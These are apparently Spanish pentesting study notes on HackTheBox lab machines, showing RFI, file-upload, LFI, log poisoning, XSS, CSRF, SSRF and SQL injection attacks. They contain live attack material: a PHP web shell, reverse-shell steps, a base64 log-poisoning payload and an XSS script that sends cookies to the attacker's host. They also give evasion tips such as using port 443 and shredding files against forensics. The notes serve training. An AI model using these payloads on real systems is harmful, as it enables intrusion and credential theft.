+-wfuzz -c -L -t 400 --hc=404 -w wp-plugins.fuzz.txt https://10.10.10.88/webservices/wp/FUZZ -> Nos encuentra un plugin llamado "wp-content/plugins/gwolle-gb/", el cual
+si buscamos por https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ vemos que si existe y es vulnerable.
+Aquí es cuando viene la FASE DE EXPLOTACIÓN DE VULNERABILIDADES:
+-searchsploit gwolle -> Utilizando la herramienta Searchsploit y buscando por el nombre del plugin, nos mostrará si existe algun exploit. En este caso nos aparece un
+exploit de tipo Remote File Inclusion (RFI). Esto es cuando desde otra máquina (una tercera) somos capaces de apuntar, desde ciertos parametros de la url, a archivos
+de terceros. Entonces, si creamos un scripts php malicioso, que me ejecute tareas por detras que injecte yo por comandos, y desde esa máquina podemos apuntar hacia
+nuestro archivo desde el servidor web, esa máquina va a ejecutar e interpretar mis acciones. Podiendo lanzar por ejemplo una shell a nuestra máquina atacante.
+-searchsploit -x php/webapps/38861.txt -> Parámetro -x para inspeccionar el codigo del exploit. En este caso, es un archivo .txt que nos muestra paso a paso lo que
+tenemos que hacer para vulnerar el sitio web. 
+Lo que tenemos que hacer es irnos a la ruta https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<servidor
+web que nosotros vamos a estar alojando>. En ese servidor tendremos que tener el archivo wp-load.php, el cual podemos conseguir por internet (no hace falta que sepamos
+php para este caso), por ejemplo en pentestmonkey.net podemos descargar el comprimido php-reverse-shell.php que ejecutará las instrucciones necesarias para enviarnos
+una shell. Modificamos el archivo para indicarle nuestra dirección IP y por el puerto que nos vamos a poner en escucha (por donde nos hará llegar la shell). Una buena
+práctica es poner el puero 443 (https), ya que muchas veces pasa desapercibido entre los firewalls como si fuera tráfico de navegación web.
+mv php-reverse-shell.php wp-load.php -> Le cambiamos el nombre, ya que el exploit nos dijo que el archivo se tenia que llamar wp-load.php.
+Ahora esto lo tenemos que comparir a través de un servidor web:
+-python -m SimpleHTTPServer 80 -> Con el parametro -m le indicamos un modulo de python "SimpleHTTPServer" para compartir el directorio actual a través del puerto
+indicado. Si nos vamos al localhost veremos como si lo esta compartiendo.
+-nc -nlvp 443 -> Primeramente, nos ponemos en escucha por el puerto 443.
+Seguidamente, lo unico que tenemos que hacer para que el exploit lance la reverse-shell es ir a la ruta https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
+frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.18 (nuestra dirección IP). De esta forma ganaríamos el acceso remoto a la máquina victima, eso si, desde un
+usuario no privilegiado (www-data). Por el momento, vemos que la shell no es del todo manejable por lo que hay que efectuar un tratamiento de la TTY. 
+
+
+TRATAMIENTO DE LA TTY TRAS UNA INTRUSION
+Este tratamiento hay que hacerlo para tener una consola completamente interactiva y poder trabajar de forma más comoda.
+-script /dev/null -c bash -> En este punto se nos lanza una pseudo-consola. Veremos el usuario@hostname. 
+Una vez que tenemos esto hacemos Ctrl+z y dejamos el script ejecutandose en segundo plano y ejecutamos:
+-stty raw -echo -> Después de escribir esto ponemos "fg" (aunque no se vea lo estamos escribiendo) y le damos al enter. Seguidamente, le indicamos que haga un reset de
+la configuración de la terminal, con "reset". Nos pedirá un tipo de terminal, un tipo recomendado es xterm.
+-echo $TERM -> Comprobamos si realmente a nivel de term esta utilizando una xterm, y si no lo hace ponemos:
+-export TERM=xterm -> Seteamos xterm como variable de entorno TERM.
+-export SHELL=bash -> Para indicarle que queremos utilizar a nivel de shell una bash.
+En este punto ya tenemos una shell completamente interactiva, ahora lo unico que faltaría es setear corrrectamente las proporciones de la shell. Para ello debemos saber
+primero las proporciones que tiene una pantalla completa. Desde una terminal a parte lo podemos comprobar poniendo:
+-stty -a -> Nos quedamos con el número de lineas y columnas. En este caso, 52 y 187 respectivamente.
+Ahora lo unico que tendríamos que hacer es indicarle estas proporciones a la shell. Lo hacemos con:
+-stty rows 52 columns 187 -> Ejecutando este comando ya tenemos una shell completamente interactiva con las proporciones adecuadas para trabajar de forma cómoda.
+
+
+USO DE SEARCHSPLOIT Y EXPLOIT-DB PARA LA BUSQUEDA DE VULNERABILIDADES
+Searchsploit basicamente lo que hace es comunicarse con la página de exploit-db, esta página es excesible desde un navegador web y es una fuente centralizada donde hay
+exploits de todo tipo. Cualquier cosa que aparezca en la página web es lo que vamos a ver nostros desde la herramienta searchsploit desde consola.
+-apt install exploitdb -y -> Para installar searchsploit.
+-searchsploit -u -> Para actualizar la base de datos.
+Muchos de los exploits se basan en que la máquina víctima nos envie una shell interactiva (reverse-shell) mediante netcat o que ejecute instrucciones maliciosas en
+segundo plano que nos hagan ganar acceso a la máquina.
+Todas las busquedas que se pueden hacer por la página web también las podemos hacer desde terminal:
+-searchsploit Http File Server -> Http File Server es el nombre del servicio que queremos vulnerar (que es lo mismo que escribiríamos en la sección de busqueda de la
+página web). Veremos una serie de recursos, de esta forma es mucho más comodo y rápido porque podemos localizar rápidamente si estamos ante un script en ruby, python, 
+c, si es un txt o lo que sea. Todos los que pongan Metasploit es que ya estan incluidos en la propia herramienta de Metasploit.
+-searchsploit Http File Server -w -> De este modo se nos reportaría la dirección url de exploit-db por si queremos consultarlo por la web.
+Todos los exploits tienen un identificador único, por tanto si queremos examinar un exploit en concreto lo que podemos hacer es:
+-searchsploit -x <identificador> -> Este comando nos permite ver el código fuente del exploit con el identificador dado.
+Pero, como nos descargamos el exploit? Pues bien lo podemos hacer con el siguiente comando:
+-searchsploit -m <identificador> -> Con este comando le indicamos que nos mueva el exploit al directorio actual de trabajo. Recuerda que con el mkt nos crea un
+directorio "exploits" especificamente para esto.
+
+
+DIFERENCIA ENTRE VULNERABILIDADES LOCALES Y REMOTAS
+Como logicamente pensariamos:
+una vulnerabilidad REMOTA es un exploit que tu tienes y lo ejecutas de manera remota desde tu máquina de atacante hacia la máquina víctima. Es decir, que tu no tienes
+que estar en la máquina víctima (con consola interactiva) para ejecutar esa vulnerabilidad.
+En cambio, una vulnerabilidad LOCAL, como podría ser, por ejemplo, una escalada de privilegios se tiene que ejecutar dentro de la máquina víctima de forma local. En 
+pentesting lo normal cuando comprometemos una máquina, la mayoría de las veces, es acceder con un usuario con bajos privilegios e ir escalando mediante diferentes
+exploits y fallos del sistema. Todo de manera local en la máquina víctima.
+
+
+USO DE LA HERRAMIENTA METASPLOIT
+Primeramente, tendremos analizar la máquina víctima para identificar servicios y versiones, y ya en este punto jugar con Metasploit para encontrar exploits
+potenciales a utilizar. En el caso de ejemplo, vemos que el servicio web utiliza un servidor HFS (Http File Server) y, como ya hemos visto, una opción que tendríamos
+sería con searchsploit buscar en exploit-db algunos exploits potenciales y ejecutarlos manualmente. Sin embargo, en este caso vamos a utilizar Metasploit:
+-msfdb run -> Este comando es necesario solamente si nunca hemos abirto metasploit, para que nos cree un usuario, inicialice la base de datos y servicio PostgressSQL...
+En este punto, ya tendremos la herramienta abierta y una consola interactiva que nos permite ejecutar comandos. Las busquedas son muy parecidas a la herramienta
+serchsploit:
+-search hfs -> Para buscar exploits de Http File Server, en este caso ponemos las siglas para hacer la busqueda.
+Para utilizar un exploit la hacemos "use <exploitName>":
+-use exploit/windows/http/rejetto_hfs_exec -> Marcamos que exploit queremos utilizar y lo carga para ejecución
+-info -> Listamos toda la información del exploit que tenemos cargado
+-show options -> Nos permite ver que parámetros nos pide el exploit para setear
+-set <option> -> Con set indicamos al exploit toda la información requerida para ejecutarlo (RHOSTS, RPORT, SRVHOST, SRVPORT...)
+Una vez hecho esto, tenemos que configurar el "listener", anteriormente lo habíamos hecho con netcat, pero en este caso el listener se puede configurar desde la propia
+herramienta de metasploit. Basicamente, lo que hay que hacer es configurar una sesión de escucha que a la hora de ejecutar esta vulnerabilidad la máquina víctima nos 
+envie una shell, por lo que nostros tendremos que estar escuchando por un puerto concreto para poder recibirla.
+
+Como se configura un listener? Tenemos que setear el payload con las opciones con las que queremos trabajar:
+-set payload windows/meterpreter/reverse_tcp -> Seteamos algunos parámetros, como por ejemplo, que la máquina víctima con la que estamos tratando es windows, que
+queremos obetener una reverse shell a través del protocolo TCP mediante una sesion meterpreter (sesion de escucha que se establece desde metasploit).
+-show options -> Vemos que nos aparecen otras opciones para el payload. También nos pide el local host (LHOST = IP máquina atacante) y el local port (LPORT = puerto
+por el que queremos hacer la escucha), por lo tanto:
+-set LHOST 10.10.14.18
+-set LPORT 4645 -> Realmente puede ser cualquier puerto que no este en uso.
+-exploit -> Cuando ya estan seteadas todas las opciones ejecutamos el exploit. Es metasploit quien se encarga de efectuar la sustitución de los parámetros que nostros 
+le hemos indicado en el código del exploit. Además también inicia la sesión de escucha automáticamente.
+Si se abre una sesión Meterpreter es que el exploit a funcionado y, en este caso, ya estamos dentro de la máquina víctima. Unicamente tendríamos que lanzar una consola
+interactiva con el comando shell. A continuación el atacante debería buscar diferentes maneras potenciales para escalar privilegios para convertirese en 
+NT AUTHORITY\SYSTEM (administrador del sistema = root en Linux).
+
+
+EXPLOATACIÓN MANUAL DE LA VULNERABILIDAD ANTERIOR (SIN METASPLOIT)
+Como lo haríamos sin metasploit? Pues lo primero que tendríamos que hacer es buscar el exploit por searchsploit:
+-searchsploit http file server -> Buscamos un exploit que se adapte a lo que queremos hacer. En este caso, buscamos un exploit que se ejecute de forma remota para una
+máquina windows. Cuando hay variantes de un mismo esploit es mejor quedarse con la última versión, ya que generalmente es una versión mejorada de las anteriores.
+-searchsploit -m <id> -> Movemos el exploit con identificador único <id> al directorio actual de trabajo.
+Modificamos el exploit para indicarle nuestra dirección IP y por el puerto que nos vamos a poner en escucha (por donde nos hará llegar la shell). Una buena
+práctica es poner el puero 443 (https), ya que muchas veces pasa desapercibido entre los firewalls como si fuera tráfico de navegación web.
+-python -m SimpleHTTPServer 80 -> Con el parametro -m le indicamos un modulo de python "SimpleHTTPServer" para compartir el directorio actual a través del puerto
+indicado. El exploit nos dice que en este directorio tiene que haber un ejecutable del programa netcat del que la máquina víctima hará un GET. Si nos vamos al
+localhost veremos como si lo esta compartiendo.
+-nc -nlvp 443 -> Desde una bash con el siguiente comando de netcat nos ponemos en escucha por el puerto 443.
+-python 39161.py 10.10.10.8 80 -> Ejecutamos el exploit, en este caso con los párametros IP máquina víctima y puerto. En este momento, por el servidor que hemos 
+abierto anteriormente veremos que de algun modo la máquina víctima ha hecho el GET del ejecutable de netcat (nc.exe). Pero aun no hemos ganado acceso a la máquina. Es
+muy común que haya que ejecutarlo varias veces para que funcione. Cuando lo volvamos a ejecutar detctará que ya tiene el archivo de netcat y lo ejecutará, mandandonos
+una reverse shell por el puerto que 443 en el que estamos escuchando. Ahora si que hemos ganado acceso a la máquina víctima.
+
+
+USO DE LA HERRAMIENTA BURPSUITE
+BurpSuite es una herramienta muy potente para pentesting web. Actua como un intermediario (proxy), nos permite interceptar peticiones así como ver las que se estan
+emitiendo, entre muchas otras cosas que iremos viendo a continuación. Configuración:
+-burpsuite -> Para abrir la herramienta. En la pestaña de Proxy -> Proxy settings. Vemos que esta puesta la dirección localhost (127.0.0.1), la herramienta esta
+escuchando en nuestro equipo local por el puerto 8080, cualquier petición que se emita en la máquina local sobre ese puerto lo vamos a poder interceptar 
+(pestaña Intercept).
+Hay que configurar el navegador web para que todo del tráfico de las peticiones y consultas que hagamos viajen primero por BurpSuite. Para ello, en el navegador
+(Firefox) vamos a settings, buscamos network -> network settings -> Manual proxy configuration y ponemos el localhost y puerto 8080 como hemos visto en la configuración
+de BurpSuite -> Also set this proxy for HTTPS. En este punto, todas las petciones que hagamos pasaran por el proxy antes de llegar a nosotros. 
+BurpSuite nos puede llegar a dar problemas a la hora de tramitar peticiones HTTPS, ya que el navegador no confiará de primeras en el CA (Certification Authority) del
+proxy. Para solucionar este problema debemos ir a la página https://burp/ y nos podremos descargar un certificado. Este certificado lo tendremos que guardar en nuestro
+navegador, para que las próximas ocasiones que visitemos una página https bajo el certificado del proxy de BurpSuite el navegador confíe. Para ello, en el navegador 
+(Firefox) vamos a settings, buscamos certificates e importamos el certificado que acabamos de descargar. Todo este proceso lo podríamos hacer con cualquier otro 
+navegador que queramos.
+Primeramente, antes de empezar lo común es definir un scope, para no tener ruido, y de esta manera unicamente capturar las peticiones de una url específica.
+
+
+BURPSUITE - DEFINICIÓN DE SCOPE Y COMPROMETIENDO UN SERVIDOR WEB
+En el ejemplo, veremos como comprometer el servico web de la @IP 10.10.10.6 mediante BurpSuite. Queremos definir uns scope para que solamente interceptemos paquetes de
+la máquina víctima. Primeramente, borramos los item que ya pudieramos tener activos (en HTTP history y en Site map) y seguidamente nos vamos a opciones y marcamos la
+casilla "Don't send items to Proxy history or live tasks, if out of scope". Ahora sí, vamos a la pestaña de Scope (Target -> Scope) y añadimos la URL de la web víctima.
+Vemos que solo nos capura las peticiones dirigidas a esa dirección.
+Como hemos hecho veces anteriores vamos a tratar de fuzzear el servidor web 10.10.10.6/FUZZ con Wfuzz para saber que hay por detrás, si existe alguna ruta potencial...
+Encontramos una ruta torrent -> 10.10.10.6/torrent/ donde parace que reside un servicio de alojamiento de torrents. Antes de intentar por fuerza bruta a alguno de los
+usuarios existentes nos comportaremos con un usuario normal y nos registraremos. Una vez registrados trataremos de subir un archivo torrent a la página. Se sube sin
+problemas y vemos que para cada archivo torrent subido permite assignarle una imagen descriptiva. El punto aqui es averiguar si te permite subir algo que no sea una
+imagen para ver como se comporta el servidor. Tratamos de subir un archivo .php malicioso, creamos  shell.php que contenga una web-shell (que nos permite ejecutar
+comandos cmd desde la web):
+
+	<?php
+            echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+	?>
+
+Jugamos con una funcionalidad de php (shell_exec) donde a través de un parámetro llamado cmd voy a poder controlar que comandos quiero ejecutar a nivel de sistema.
+-php -S 0.0.0.0:80 -> Nos montamos un servidor http en el localhost para ver que la web-shell funcione. Si comprobamos http://localhost/shell.php no vemos nada pero
+como hemos defínido un parámetro cmd con el que puedo controlar que parametros quiero que se ejecuten a nivel de sistema. Lo hacemos de la siguiente forma 
+http://localhost/shell.php?cmd=whoami y vemos que el comando nos devuelve lo mismo que como si estuvieramos en la shell local, por lo que tenemos control total sobre
+el sistema.
+Pues lo que vamos a tratar de hacer es subir esta utilidad al sevidor víctima, ya que si deja subir el archivo y encontramos donde se almacena para poderlo apuntar 
+desde la URL podremos ejecutar comandos en la shell del servidor como el usuario que me esta sirviendo el servidor web (probablemente www-data).
+Subiendo el archivo directamente vemos que nos lo rechaza (invalid file). Tenmos que encontrar una forma de engañar al servidor web. En este punto, haremos uso de 
+BurpSuite para saber que validación esta haciendo el servidor para saber si lo que el usuario esta suv¡biendo es una imagen o no, lo ponemos en escucha y subimos 
+una imagen cualquiera. En BurpSuite vemos la petición de subida (POST) donde existe el campo "Content-Type", pues si el (mal) programador a decidido que el contenido
+de este campo va a ser lo que permita subir un archivo o no, esto, es una vulnerabilidad potencial. Dejando el campo "Content Type" como image/jpeg cambiamos el
+el filename a un archivo .php y suprimimos el raw de la imagen por nuestro codigo malicioso. Le damos al botón de fordward para que la petición viaje al servidor y 
+quitamos el intercept. Vemos como la petición de subida de imagen se ha completado correctamente, ahora nuestro archivo malicioso esta alojado en el servidor.
+Recargamos la página y nos dice que "Image not Found!" si ponemos el cursor encima, haciendo hoverning, para ver desde donde me esta cargando la imagen vemos donde se
+almacenan los archivos subidos. Si vamos a esa dirección y clickamos en el archivo php vemos que estamos en la misma situación que teniamos en nuestro servidor local.
+Tenemos ejecución remota de comandos y con el comando ip a vemos qu estamos en la máquina víctima. En este punto lo que vamos a tratar de hacer es lanzar una
+reverse-shell. Podemos ir a páginas como pentestmonkey.net que nos ofrece varias maneras de poder entablar una reverse-shell, en el ejemplo utilizamos netcat. Copiamos
+el código que lanza la reverse shell y lo copiamos en la URL para ejecutar el comando de parte del servidor, cambiamos la IP (máquina atacante) y Puerto (por el que 
+voy a escuchar). Antes de lanzar el comando nos ponemos en escucha por nuestra máquina atacante por el puerto 443 y ahora si ejecutamos el comando (puede que no todos 
+los comandos funcionen por lo que tenemos que ir cambiando hasta que uno funcione). Ahora solo faltaría hacer el tratamiento de la tty y tendríamos una shell 
+completamente interactiva sobre la máquina víctima. Si nos vamos a BurpSuite en la pestaña de Site map vemos que la propia herramienta hace crowling del servidor web 
+para poder encontrar diferentes archivos y directorios, esto lo hace en segundo plano mientras nosotros navegamos por la web. Nos aporta también algunos issues de
+seguridad (contraseñas en texto plano, emails...).
+Opcional: Podríamos borrar el archivo php para no dejar rastro:
+-shred -zun 10 -v <nombre archivo> -> Comando que nos borra incluso la tablas de indices para que no se pueda recuperar mediante prácticas forenses.
+
+
+BURPSUITE USO DEL REPEATER Y EXPLOTANDO UN CASO PRÁCTICO
+¿Qué hacemos si queremos volver a ejecutar comandos en el servidor web anteriormente explotado? ¿Tenemos que volver a hacer todo el progreso? No hace falta!
+Podemos aprovechar y utilizar una de las funcionalidades que tiene la herramienta, el repeater. Primeramente, nos vamos al apartado de HTTP history y buscamos la 
+petición que nos gustaría volver a envíar, en este caso la petición de subida del archivo malicioso fue un POST, pues buscamos esa petición, la seleccionamos y la 
+mandamos al repeater con Ctr + R o click derecho y "Send to Repeater". Lo unico que tenemos que hacer es clickar el botón "Go" y veremos la respuesta del servidor.
+Lo que podemos hacer también es capturar la petición de un comando poniendo el intercept on y enviar esta petición al repeater de modo que cuando queramos ejecutar
+cualquier otra comando lo podamos hacer directamente desde BurpSuite viendo la respuesta del servidor. Podemos organizarnos el espacio de trabajo en diferentes pestañas
+y de este modo trabajar más cómodos (Upload-File, RCE...). Una cosa que hay que tener en cuenta es que los comandos tienen que ir en un formato "URL-encoded" en el que,
+por ejemplo los espacios son un "+" -> ls -l == ls+-l. Podemos selecionar el comando y hacer Ctr + u para que haga el cambio de forma automática.
+
+
+USO DEL INTRUDER Y EXPLOTANDO UN CASO PRÁCTICO
+En este caso mandamos la trama anterior que teniamos en el repeater de RCE al intruder, lo hacemos con Ctr + i o click derecho y "Send to Intruder". Una vez en la 
+pestaña de intruder vamos a "positions" y clickamos a "Clear" porque yo voy a definir cuales van a ser mis payloads. Nos aseguramos que el Attack type sea "Sniper".
+Por ejemplo, selecionamos el comando que estamos ejecutando remotamente y clickamos a "Add" para añadir un payload en ese punto. Nos vamos a la pestaña de "Payloads" y
+lo que podemos hacer es cargar un diccionario, en este caso necesitaríamos uno de comandos. Por último, vamos a la pestaña de "Options" y en el apartado de 
+"Grep-Extract" y, en este ejemplo, nos interesa crear una expresión regular para que nos muestre solamente la output del comando.
+Una vez hecha esta configuración trabajaremos de forma mucho más cómoda, ya que cuando le damos a "Start Attack", lo que va a hacer BurpSuite es ejecutar todos los 
+comandos que haya en el diccionario, aplicando el filtro de la expresión regular, y mostrandolo todo en una pestaña de resultados. Cualquier cosa que queramos fuzzear
+(segmento de la URL, cualquier campo de la petición post...) lo podemos hacer con un ataque tipo Sniper, Cluster-Boom o el que aplique mediante diccionarios en la
+sección de Intruder de BurpSuite.
+
+
+EXPLOTANDO VULNERABILIDAD LOCAL FILE INCLUSION (LFI)
+Como en otros ejemplos anteriores, hacemos los procedimientos básicos a la hora de enfrentarnos a una máquina vulnerable. Realizamos el escaneo (SO, puertos abiertos,
+servidor web...) y miramos de buscar un exploit que nos sirva con la herramienta searchsploit. En este caso buscamos directamente por el nombre de la web:
+-searchsploit Elastix -> Vemos que existe una vulnerabilidad LFI en el fichero 'graph.php'.
+-searchsploit -x <path> -> Inspeccionamos el código. Vemos que entre otras tecnicas se utiliza un directory path traversal (../../../../etc/file.conf) y el %00 para tratar 
+la extensión que esra seteada por default y de esta forma que leea la extensión que tu estas tratando de indicar.
+Copiamos el exploit directamente en la url (directamente después de la @IP) y se nos muestra un fichero de configuración con información del sistema (usuarios, contraseñas)
+e incluso podemos ver el codigo fuente con Ctrl + u para ver el fichero de una forma más legible.
+Esto es de lo que hablamos cuando decimos que es una vulnerabilidad local file inclusion, porque de la misma manera que he podido leer este fichero de configuración del
+sistema, puedo leer cualquier fichero al que el usuario detras del gestor de contenidos tenga acceso en la máquina víctima.
+Podemos utilizar Burpsuite haciendo la misma petición de antes (antes deberiamos definir el scope) para interceptar las peticiones y poder trabajar de una manera más
+eficiente y organizada.
+Otra cosa que podemos hacer en una vulnerabilidad LFI es irnos al fichero /proc/net/tcp que nos mostrara que puertos estan abiertos interamente (aunque no los podamos ver
+desde el exterior). Si nos copiamos el contenido del ficherp y aplicamos el siguiente filtro:
+-cat file.txt | awk '{print $2}' | awk '{print $2}' FS=":"| sort -u -> Con este filtro podriamos ver los puertos abiertos, mostrados en hexadecimal.
+
+
+EXPLOTANDO VULNERABILIDAD LOG POISONING - LFI TO RCE
+¿Cuando estamos explotando una vulnerabilidad LFI puedo de alguna forma forma convertirlo a ejecución remota de comandos o solo puedo leer archivos? Sí, aprovechando la 
+vulnerabilidad log poisoning. Para poder hacerlo tenemos que tener la posibilidad de leer un archivo en formato 'log', que normalmente se debera a una mala configuración de
+los permisos de los .log de un servicio. Aprovechando LFI podemos leer este archivo (desde la url) y vemos que este archivo, en este caso el acess.log de apache, registra
+todas las peticiones realizadas. Lo realmente importante es que estas peticiones las podemos alterar con BurpSuite o curl e insertar codigo php. 
+-curl "http://LFI=/var/log/apache2/access.log" -H "User-Agent: <?php system('whoami')?>" -> El usuario www-data nos ejecutará comando whoami.
+Pues podriamos obtener una RCE aprovechando esto, pero esta vez con el archivo auth.log (nos registra todas las autorizaciones del sistema) y el servicio ssh.
+-ssh '<?php system("echo <codigo en base64 para obtener una reverse shell> | base64 -d | bash");?>'@localhost -> Nos pedirá una contraseña, ponemos una cualquiera no
+importa. Seguidamente, nos ponemos en escucha por el puerto que hayamos especificado en el netcat y lanzamos la petición de lectura del archivo auth.log mediante la 
+vulnerabilidad LFI. Veremos que el usuario www-data nos ha lanzado una shell y tenemos ejecución remota de comandos (RCE).
+
+
+EXLOTANDO LA VULNERABILIDAD HTML INJECTION Y XSS (CROSS-SITE SCRIPTING)
+Como siempre realizamos el scaneo de la máquina víctima (Secnotes) whichSystem, whatweb, nmap... Y podemos probar a lanzar unos scripts básicos de enumeración. 
+Por otra parte, investigamos el servicio web y vemos que nos podemos registrar, lo hacemos. Vemos que es una página que te permite crear tus propias notas. Podemos comprobar
+si es vulnerable a una injección html al crear una nota. Si con la etiqueta <h1>Texto</h1> vemos que se me interpreta el html y vemos el texto en grande será vulnerable. 
+Esto no es tan crítico pero sin duda es algo a tener en cuenta. Podemos testear también si es vulnerable a injección xss, para ello al crear una nota probamos si es posible
+lanzar una ventana emergente. Probamos poniendo <script>alert("Texto")</script> y al recargar vemos que si que nos aparece la ventana emergente, ya que parece que desde la
+nota creada nos esta interpretando el xss. Esto en si tampoco es algo muy crítico pero lo podemos convertir en algo crítico si tratamos de robar las cookies de sesión de un
+usuario.
+-python -m SimpleHTTPServer 80 -> Primeramente, nos compartimos un servidor http con phyton por donde veremos la cookie robada.
+Crearemos una nueva nota con el siguiente contenido: <script>document.write('<img src="http://<ip local>/image.jpg?cookie=' + document.cookie +'">')</script> y al recargar
+estaremos capturando la cookie de sesión del usuario. Por lo que si conseguimos injectar esto en una página podremos robar todas las cookies de sesión de los usuarios que
+esten autenticados e iniciar su sesión sin necesidad de contraseña (modificando el campo de cookie con BurpSuite en la petición a la pagina ya logeada -> ip/home.php).
+
+
+EXPLOTANDO VULNERABILIDAD CROSS-SITE REQUEST FORGERY (CSRF)
+Para llevar a cabo la explotación de esta vulnerabilidad necesitamos la interacción de un usuario. La idea del CSRF es que tu te puedas construir una dirección URL tal que
+cuando alguien acceda se apliquen cambios para dicha cuenta. Un ejemplo practico desde la máquina víctima (Secnotes), vamos a interceptar un cambio de contraseña de una 
+cuenta de usuario (mediante BurpSuite) pero vamos a tratar que la petición viaje por GET (en la URL) en vez de POST. Transmitimos la petición capturada en BurpSuite a la
+sección de Repeater y  hacemos clik derecho -> Change request method para cambiar la petición a GET. Lo que hará que viajen los datos en la URL como parametros. Si al
+transmitir la petición la máquina nos deja hacerlo, ya sería crítico. Vemos el mensaje de password updated por lo que si a tenido efecto el cambio de contraseña, hemos
+cambiado la contraseña a través de una URL específicamente diseñada. De esta manera podriamos por ejemplo, mediante ingenieria social, intentar de cambiar la contraseña de 
+un usuario administrador haciendo que el admin de la página web entre mediante la URL que hemos construido, ganando nosotros de esta manera acceso a su cuenta.
+
+
+EXPLOTANDO VULNERABILIDAD SERVER-SIDE REQUEST FORGERY (SSRF)
+En este tipo de vulnerabilidad ya no necesitaremos de la interacción de un usuario para llevar a cabo acciones sobre la víctima, como por ejemplo listar información
+privilegiada a nivel interno de sistema. Como siempre realizamos el scaneo de la máquina víctima (Haircut) whichSystem, whatweb, nmap... Y podemos probar a lanzar 
+unos scripts básicos de enumeración. Utilizaremos también wfuzz para mirar de obtener algun tipo de ruta potencial:
+-wfuzz -c -t 500 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.24/FUZZ.php -> Para buscar recursos php visibles.
+Encontramos el recurso exposed.php en el que nos permite hacer peticiones al servidor de los recursos internos de la página, ya que podemos hacer cualquier petición https
+(siempre y cuando no este bien configurado, en una pagina segura no deberiamos poder). Por lo que es una utilidad que nos permite listar el contenido de una web en base a
+la url que yo le especifique. Lo que vamos a tratar de descubrir aprovechando esta información es si, internamente, la máquina tiene más puertos abiertos que no se ven
+desde fuera con nmap. Haciendo uso de BurpSuite para interceptar la petición probamos a mirar si esta abierto el puerto 1 -> http://localhost:1 (en el recurso exposed.php)
+Como en la vulnerabilidad anterior lo enviamos al Intruder -> Positions para efectuar un ataque de tipo Sniper, ya que queremos utilizar un unico payload. Primero de todo,
+vemos que el payload esta urlcodeado, para poder verlo lo seleccionamos y hacemos Ctrl + Shift + u. Ahora seleccionamos el 1 que marca el numero de puerto y clickamos en
+add $ para inyectar mis payloads. Nos vamos al apartado de payloads y seleccionamos Numbers en el apartado de tipo de payload, ya que queremos que sea un secuenciador.
+Definimos una secuencia que vaya desde el 1 al 65535 con un step de 1. Efectuamos el ataque y nos vamos a fijar en el tamaño, vemos que hay varios puertos que no se nos
+listaban desde fuera que tambien contienen información. Basicamente este tipo de vulnerabilidad nos permite encontrar y listar información privilegiada que no deberiamos
+poder ver.
+
+
+EXPLOTANDO VULNEREABLIDAD SQL INJECTION - SQLMAP
+Vamos a utilizar la herramienta SQLmap que te automatiza todas las inyecciones SQL posibles para tratar de dumpear y obtener la información de una base de datos. En este
+caso estaremos tratando con la máquina víctima Rabbit (HTB) y como siempre realizamos un scaneo whichSystem, whatweb, nmap... Vemos que hay muchos puertos abiertos, pero de
+todas forma podemos probar a lanzar unos scripts básicos de enumeración, aunque llevará un tiempo. El puerto 8080 esta abierto y este normalmente también lista un servicio
+web. Con whatweb buscamos información sobre este servicio web y vemos que es un Apache con Title[Example]. Ahora lo que nos interesa es encontrar rutas potenciales, esto
+como siempre lo hacemos con wfuzz:
+-wfuzz -c -t 100 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.71:8080/FUZZ -> Para buscar rutas potenciales sobre este
+servicio web. Fuzzeando encontramos el recurso complain (Complain Management System) donde nos podemos autenticar o registrar. Siempre que nos den la opción nos 
+registraremos nostros mismos para seguidamente poder logearnos. Ahora por ejemplo podriamos buscar un exploit relacionado con el gestor web Complain Management System, una 
+opción disponible vemos que es Hard-Coded Credentials / Blind SQL injection. Este exploit nos dice que añadiendo lo siguiente a la url seremos capaces de ver los planes
+que ofrecen -> view.php?mod=admin&view=repod&id=plans comprobamos que funciona y una forma de ver si es vulnerable a SQL injection es añadir un ' (comilla) al final de la 
+url y si nos aparece un error SQL lo más probable es que sea vulnerable. El exploit además nos dice que utilicemos sqlmap para hacer la explotación:
+-sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --dbs --batch --random-agent -> En el parámetro cookie
+le tenemos que indicar nuestra cookie de sesión para que sqlmap sea capaz de llegar hasta donde estamos nosotros. Hay un orden de prioridad que normalmente nos va a
+interesar seguir: 1. Bases de datos 2. Tablas 3. Columnas 4. Dumpear y obtener todos los datos (usuarios, contraseñas, direcciones, tlf...). Para ello con el parámetro dbs
+obtendremos las bases de datos disponibles, con el parametro batch sqlmap no nos preguntará y actuará por defecto. Por último, con random-agent lo que hacemos es randomizar
+el User Agent, que nos proporciona una mayor tasa de éxito. Con este comando SQLmap empezará a probar con un montón de injecciones sql. Pero con la información que hemos
+obtenido del mensaje de error de antes ya sabemos que la base de datos se trata de un servicio MySQL, por lo que para ser más eficiente podriamos poner en el comando el
+parámetro --dbms=mysql para especificar que estamos trabajando con MySQL:
+-sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --dbs --batch --random-agent --dbms=mysql
+SQLmap, entre otras cosas, nos dirá que el parámetro 'id' es injectable y que ha sido posible obtener diferentes bases de datos existentes a nivel de sistema a través del
+servicio MySQL. Como nos hemos registrado nuestra infromación debería estar en la base de datos que hemos obtenido. Todo apunta en que debe estar en la base de datos llamada
+complain, para que nos muestre las tablas de la base de datos complain lo podemos indicar con el siguiente comando:
+-sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --D complain --tables --batch --random-agent --dbms=mysql
+Una vez que sabemos las tablas queremos que nos muestre las columnas de la tabla que nos interese, en este caso la de los clientes:
+-sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --D complain --T tbl_customer --columns --batch --random-agent --dbms=mysql
